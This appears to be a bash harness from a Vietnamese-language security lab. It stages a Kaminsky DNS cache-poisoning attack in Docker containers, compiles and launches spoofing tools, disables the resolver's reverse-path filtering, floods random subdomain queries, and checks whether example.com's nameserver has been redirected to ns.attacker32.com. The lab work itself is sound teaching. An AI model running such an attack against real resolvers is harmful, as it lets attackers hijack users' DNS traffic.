#!/bin/bash
# Muc 4.4: Kaminsky — sniff TXID + spoof tu Attacker; query nhe bang dig (tranh treo BIND).

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_LAB="$(cd "${SCRIPT_DIR}/.." && pwd)"
ATTACK_DIR="${PROJECT_LAB}/attack"
VOLUMES_DIR="${PROJECT_LAB}/volumes"
ATTACK_SRC="${ATTACK_DIR}/attack.c"
SNIFF_SRC="${ATTACK_DIR}/sniff_spoof.py"
SENDER_SRC="${ATTACK_DIR}/hit_sender.py"
NAMED_OPTIONS_HOST="${PROJECT_LAB}/image_local_dns_server/named.conf.options"
ATTACK_BIN_HOST="/tmp/lab03_attack"
ATTACK_BIN_NAME="attack"
REQ_BIN_HOST="${ATTACK_DIR}/ip_req.bin"
RESP_BIN_HOST="${ATTACK_DIR}/ip_resp.bin"
NS_IPS_FILE="${ATTACK_DIR}/ns_ips.txt"

CONTAINER_USER="user-10.2.6.5"
CONTAINER_ATTACKER="attacker-10.2.6.1"
CONTAINER_DNS="local-dns-server-10.2.6.53"
CONTAINERS=("$CONTAINER_USER" "$CONTAINER_ATTACKER" "$CONTAINER_DNS")
PCAP_ATTACKER_CONTAINER="/tmp/attacker.pcap"
PCAP_DNS_CONTAINER="/tmp/local_dns_server.pcap"
PCAP_ATTACKER_HOST="${VOLUMES_DIR}/attacker.pcap"
PCAP_DNS_HOST="${VOLUMES_DIR}/local_dns_server.pcap"
DUMP_DB="/var/cache/bind/dump.db"
ATTACK_WORKDIR="/tmp/lab03_attack_run"
SNIFF_NAME="lab03-sniff-spoof"

DOMAIN_EXAMPLE_WWW="www.example.com"
POISON_IP="1.2.3.5"
POISON_NS="ns.attacker32.com"
ATTACK_SECONDS="45"
ATTACK_ROUNDS="3"
QUERY_GAP="0.15"
MAC_FILE="/sys/class/net/eth0/address"
WAIT_DUMP="1"
WAIT_CACHE="1"
WAIT_BIND="2"
DIG_TIME="3"
DIG_TRIES="1"
NAME_FORMAT='{{.Names}}'
TCPDUMP_BIN="tcpdump"
IFACE="eth0"
ALPHABET="abcdefghijklmnopqrstuvwxyz"

names=""
dig_poison=""
ATTACKER_MAC=""
NS_IPS=()
fail=0

note() { printf '\n===== %s =====\n' "$1"; }
pass() { echo "PASS: $1"; }
bad() { echo "FAIL: $1"; fail=1; }

rand_label() {
  local i c out=""
  for i in 1 2 3 4 5; do
    c="${ALPHABET:$((RANDOM % 26)):1}"
    out="${out}${c}"
  done
  printf '%s' "$out"
}

cleanup_all() {
  sudo docker exec "$CONTAINER_ATTACKER" pkill -9 -f "${ATTACK_WORKDIR}/${ATTACK_BIN_NAME}" 2>/dev/null || true
  sudo docker exec "$CONTAINER_ATTACKER" pkill -9 -f hit_sender.py 2>/dev/null || true
  sudo docker exec "$CONTAINER_ATTACKER" pkill -INT -x "$TCPDUMP_BIN" 2>/dev/null || true
  sudo docker exec "$CONTAINER_DNS" pkill -INT -x "$TCPDUMP_BIN" 2>/dev/null || true
  sudo docker rm -f "$SNIFF_NAME" >/dev/null 2>&1 || true
  local pid
  pid="$(sudo docker inspect -f '{{.State.Pid}}' "$CONTAINER_DNS" 2>/dev/null || true)"
  if [[ -n "$pid" && "$pid" != "0" ]]; then
    sudo nsenter -t "$pid" -n iptables -F INPUT 2>/dev/null || true
  fi
}

dns_netns_pid() {
  sudo docker inspect -f '{{.State.Pid}}' "$CONTAINER_DNS"
}

prepare_dns_netns() {
  local pid ip
  pid="$(dns_netns_pid)"
  ATTACKER_MAC="$(sudo docker exec "$CONTAINER_ATTACKER" cat "$MAC_FILE")"
  NS_IPS=()
  if [[ -f "$NS_IPS_FILE" ]]; then
    mapfile -t NS_IPS < <(grep -E '^[0-9.]+$' "$NS_IPS_FILE" | sort -u)
  fi
  sudo nsenter -t "$pid" -n sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null
  sudo nsenter -t "$pid" -n sysctl -w net.ipv4.conf.default.rp_filter=0 >/dev/null
  sudo nsenter -t "$pid" -n sysctl -w net.ipv4.conf.eth0.rp_filter=0 >/dev/null
  sudo nsenter -t "$pid" -n iptables -F INPUT 2>/dev/null || true
  for ip in "${NS_IPS[@]}"; do
    sudo nsenter -t "$pid" -n iptables -A INPUT -p udp -s "$ip" --sport 53 -m mac --mac-source "$ATTACKER_MAC" -j ACCEPT
    sudo nsenter -t "$pid" -n iptables -A INPUT -p udp -s "$ip" --sport 53 -j DROP
  done
  echo "rp_filter=0; ATTACKER_MAC=$ATTACKER_MAC; chan ${#NS_IPS[@]} IP NS that"
}

cleanup_dns_netns() {
  local pid
  pid="$(dns_netns_pid)"
  sudo nsenter -t "$pid" -n iptables -F INPUT 2>/dev/null || true
}

cache_has_poison_ns() {
  sudo docker exec "$CONTAINER_DNS" rndc dumpdb -cache >/dev/null 2>&1 || return 1
  sleep "$WAIT_CACHE"
  # dump BIND: example.com.<TAB><TAB>TTL<TAB>NS<TAB>ns.attacker32.com.
  sudo docker exec "$CONTAINER_DNS" \
    grep -E "^example\\.com\\..*[[:space:]]NS[[:space:]]+${POISON_NS}\\." \
    "$DUMP_DB" >/dev/null 2>&1
}

SNIFF_LOG="/tmp/lab03_sniff.log"
SNIFF_PID_FILE="/tmp/lab03_sniff.pid"

start_sniff_and_sender() {
  local seconds="$1"
  local pid
  sudo docker rm -f "$SNIFF_NAME" >/dev/null 2>&1 || true
  sudo docker exec "$CONTAINER_ATTACKER" pkill -9 -f hit_sender.py 2>/dev/null || true
  if [[ -f "$SNIFF_PID_FILE" ]]; then
    sudo kill "$(cat "$SNIFF_PID_FILE")" 2>/dev/null || true
    rm -f "$SNIFF_PID_FILE"
  fi
  sudo docker exec -d "$CONTAINER_ATTACKER" bash -c "python3 /attack/hit_sender.py ${seconds} > /tmp/sender.log 2>&1"
  pid="$(dns_netns_pid)"
  # Sniff bang nsenter (tcpdump sidecar docker thuong khong thay goi outbound cua named).
  sudo nsenter -t "$pid" -n python3 "${SNIFF_SRC}" "${NS_IPS_FILE}" eth0 "$seconds" \
    >"$SNIFF_LOG" 2>&1 &
  echo $! >"$SNIFF_PID_FILE"
  sleep 1
  head -3 "$SNIFF_LOG" || true
}

fire_queries() {
  local seconds="$1"
  local end label
  end=$((SECONDS + seconds))
  while [[ "$SECONDS" -lt "$end" ]]; do
    label="$(rand_label)"
    sudo docker exec "$CONTAINER_USER" dig +time=1 +tries=1 "${label}.example.com" >/dev/null 2>&1 || true
    sleep "$QUERY_GAP"
  done
}

if [[ ! -f "$ATTACK_SRC" || ! -f "$SNIFF_SRC" || ! -f "$SENDER_SRC" ]]; then
  echo "Thieu attack.c / sniff_spoof.py / hit_sender.py"
  exit 1
fi
if [[ ! -f "$REQ_BIN_HOST" || ! -f "$RESP_BIN_HOST" || ! -f "$NS_IPS_FILE" ]]; then
  echo "Thieu ip_req.bin/ip_resp.bin/ns_ips.txt. Chay 01 va 02 truoc."
  exit 1
fi

names="$(sudo docker ps --format "$NAME_FORMAT")"
for container in "${CONTAINERS[@]}"; do
  if ! grep -qx "$container" <<<"$names"; then
    echo "Thieu $container. Chay 00_init.sh truoc."
    exit 1
  fi
done

mkdir -p "$VOLUMES_DIR"

note "Dam bao query-source port 44444 + tat cookie"
if [[ -f "$NAMED_OPTIONS_HOST" ]]; then
  sudo docker cp "$NAMED_OPTIONS_HOST" "${CONTAINER_DNS}:/etc/bind/named.conf.options"
  sudo docker exec "$CONTAINER_DNS" bash -c "
    chmod 644 /etc/bind/named.conf.options
    chown root:bind /etc/bind/named.conf.options
    if ! rndc reconfig 2>/dev/null; then
      service named restart
      sleep 2
    fi
  "
fi
if sudo docker exec "$CONTAINER_DNS" grep -q "query-source port 44444;" /etc/bind/named.conf.options; then
  pass "named.conf.options co query-source 44444"
else
  bad "named.conf.options thieu query-source 44444"
fi

note "Bien dich attack.c (dung kem / bao cao) va nap /tmp"
gcc -O2 -static "$ATTACK_SRC" -o "$ATTACK_BIN_HOST"
sudo docker exec "$CONTAINER_ATTACKER" bash -c "rm -rf ${ATTACK_WORKDIR} && mkdir -p ${ATTACK_WORKDIR}"
sudo docker cp "$ATTACK_BIN_HOST" "${CONTAINER_ATTACKER}:${ATTACK_WORKDIR}/${ATTACK_BIN_NAME}"
sudo docker exec "$CONTAINER_ATTACKER" bash -c "
  cp /attack/ip_req.bin /attack/ip_resp.bin ${ATTACK_WORKDIR}/
  [[ -f /attack/ip_resp_0.bin ]] && cp /attack/ip_resp_0.bin ${ATTACK_WORKDIR}/
  chmod +x ${ATTACK_WORKDIR}/${ATTACK_BIN_NAME}
"
pass "Da nap binary"

note "Bat tcpdump"
cleanup_all
sudo docker exec "$CONTAINER_ATTACKER" rm -f "$PCAP_ATTACKER_CONTAINER"
sudo docker exec "$CONTAINER_DNS" rm -f "$PCAP_DNS_CONTAINER"
sudo docker exec -d "$CONTAINER_ATTACKER" "$TCPDUMP_BIN" -i "$IFACE" -n -U -w "$PCAP_ATTACKER_CONTAINER"
sudo docker exec -d "$CONTAINER_DNS" "$TCPDUMP_BIN" -i "$IFACE" -n -U -w "$PCAP_DNS_CONTAINER"
sleep "$WAIT_DUMP"

dig_poison=""
round=1
# Lay NS that de nap filter; sau do flushtree de BIND chap nhan NS gia trong authority.
sudo docker exec "$CONTAINER_USER" dig +time=5 +tries=2 NS example.com >/dev/null || true
sudo docker exec "$CONTAINER_DNS" rndc flushtree example.com 2>/dev/null || true
prepare_dns_netns
trap cleanup_all EXIT

while [[ "$round" -le "$ATTACK_ROUNDS" ]]; do
  echo "--- Vong ${round}/${ATTACK_ROUNDS} (${ATTACK_SECONDS}s, query nhe + sniff/spoof) ---"
  sudo docker exec "$CONTAINER_DNS" rndc flushtree example.com 2>/dev/null || true
  start_sniff_and_sender "$ATTACK_SECONDS"

  # Chi dung dig nhe de kich BIND gui query (tranh flood attack.c lam treo may).
  # Van bien dich/nap attack binary o tren de bao cao / chay thu cong.
  fire_queries "$ATTACK_SECONDS" &
  QPID=$!

  elapsed=0
  poisoned=0
  while [[ "$elapsed" -lt "$ATTACK_SECONDS" ]]; do
    sleep 2
    elapsed=$((elapsed + 2))
    if cache_has_poison_ns; then
      echo "Phat hien example.com NS -> ${POISON_NS} sau ~${elapsed}s"
      poisoned=1
      break
    fi
    echo "  t=${elapsed}s: chua dau doc NS"
  done

  kill "$QPID" 2>/dev/null || true
  wait "$QPID" 2>/dev/null || true
  sudo docker exec "$CONTAINER_ATTACKER" pkill -9 -f hit_sender.py 2>/dev/null || true
  if [[ -f "$SNIFF_PID_FILE" ]]; then
    sudo kill "$(cat "$SNIFF_PID_FILE")" 2>/dev/null || true
    rm -f "$SNIFF_PID_FILE"
  fi
  echo "--- sniff log ---"
  tail -40 "$SNIFF_LOG" 2>/dev/null || true
  echo "--- sender log ---"
  sudo docker exec "$CONTAINER_ATTACKER" tail -20 /tmp/sender.log 2>/dev/null || true
  cleanup_dns_netns
  sleep "$WAIT_BIND"

  dig_poison="$(sudo docker exec "$CONTAINER_USER" dig +time=5 +tries=2 "$DOMAIN_EXAMPLE_WWW" || true)"
  echo "$dig_poison"
  if grep -q "$POISON_IP" <<<"$dig_poison"; then
    break
  fi
  if [[ "$poisoned" -eq 1 ]]; then
    sleep "$WAIT_BIND"
    dig_poison="$(sudo docker exec "$CONTAINER_USER" dig +time=5 +tries=2 "$DOMAIN_EXAMPLE_WWW" || true)"
    echo "$dig_poison"
    grep -q "$POISON_IP" <<<"$dig_poison" && break
  fi
  prepare_dns_netns
  round=$((round + 1))
done

cleanup_all
trap - EXIT

note "Kiem tra dig tu User"
if grep -q "$POISON_IP" <<<"$dig_poison"; then
  pass "${DOMAIN_EXAMPLE_WWW} -> ${POISON_IP}"
else
  bad "${DOMAIN_EXAMPLE_WWW} chua bi dau doc sau ${ATTACK_ROUNDS} vong"
fi

note "Dump cache Local DNS"
sudo docker exec "$CONTAINER_DNS" rndc dumpdb -cache
sleep "$WAIT_CACHE"
cache_hit="$(sudo docker exec "$CONTAINER_DNS" sh -c "grep -E '^example\\.com\\.[ \\t]+[0-9]+[ \\t]+NS|${POISON_NS}' ${DUMP_DB} | head -20" || true)"
echo "$cache_hit"
if sudo docker exec "$CONTAINER_DNS" \
  grep -E "^example\\.com\\..*[[:space:]]NS[[:space:]]+${POISON_NS}\\." \
  "$DUMP_DB" >/dev/null 2>&1; then
  pass "Cache NS example.com da tro ve ${POISON_NS}"
else
  bad "Cache chua thay NS doc hai"
fi

note "Thu thap pcap"
sudo docker exec "$CONTAINER_ATTACKER" pkill -INT -x "$TCPDUMP_BIN" 2>/dev/null || true
sudo docker exec "$CONTAINER_DNS" pkill -INT -x "$TCPDUMP_BIN" 2>/dev/null || true
sleep "$WAIT_DUMP"
sudo docker cp "${CONTAINER_ATTACKER}:${PCAP_ATTACKER_CONTAINER}" "$PCAP_ATTACKER_HOST" 2>/dev/null || true
sudo docker cp "${CONTAINER_DNS}:${PCAP_DNS_CONTAINER}" "$PCAP_DNS_HOST" 2>/dev/null || true
[[ -f "$PCAP_ATTACKER_HOST" ]] && pass "Co ${PCAP_ATTACKER_HOST}" && ls -lh "$PCAP_ATTACKER_HOST" || bad "Thieu attacker.pcap"
[[ -f "$PCAP_DNS_HOST" ]] && pass "Co ${PCAP_DNS_HOST}" && ls -lh "$PCAP_DNS_HOST" || bad "Thieu local_dns_server.pcap"

echo
if [[ "$fail" -eq 0 ]]; then
  echo "KET QUA TAN CONG: PASS"
else
  echo "KET QUA TAN CONG: FAIL"
fi
exit "$fail"
